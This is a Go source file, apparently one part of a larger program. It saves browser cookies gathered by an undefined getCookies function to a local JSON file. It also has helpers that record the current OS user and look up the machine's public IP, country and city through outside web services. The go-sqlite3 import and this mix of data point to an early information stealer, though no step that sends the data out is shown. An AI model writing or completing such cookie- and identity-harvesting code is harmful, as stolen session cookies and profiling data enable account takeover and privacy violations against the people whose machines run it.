package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/user"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

func main() {
	cookieData, err := getCookies()

	if err != nil {
		log.Fatal(err)
	}

	jsonData, err := json.Marshal(cookieData)
	if err != nil {
		log.Fatal(err)
	}

	err = os.WriteFile("data.json", jsonData, 0644)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("JSON data saved to file.")

}

type UserData struct {
	OSUser user.User
	IPData IPData
}

func getOsUserData() (*user.User, error) {
	usr, err := user.Current()
	if err != nil {
		return &user.User{}, err
	} else {
		return usr, nil
	}
}

type IPData struct {
	IP      string
	Country string
	City    string
}

func getIPData() (IPData, error) {
	ip, err := fetchData("https://api64.ipify.org")
	if err != nil {
		fmt.Printf("Error retrieving IP: %s", err)
		return IPData{}, err
	}

	country, err := fetchData(fmt.Sprintf("https://ipapi.co/%s/country_name", ip))
	if err != nil {
		fmt.Printf("Error retrieving Country: %s", err)
		return IPData{}, err
	}

	time.Sleep(time.Millisecond * 500)

	city, err := fetchData(fmt.Sprintf("https://ipapi.co/%s/city", ip))
	if err != nil {
		fmt.Printf("Error retrieving City: %s", err)
		return IPData{}, err
	}

	return IPData{
		IP:      ip,
		Country: country,
		City:    city,
	}, nil
}

func fetchData(url string) (string, error) {
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}
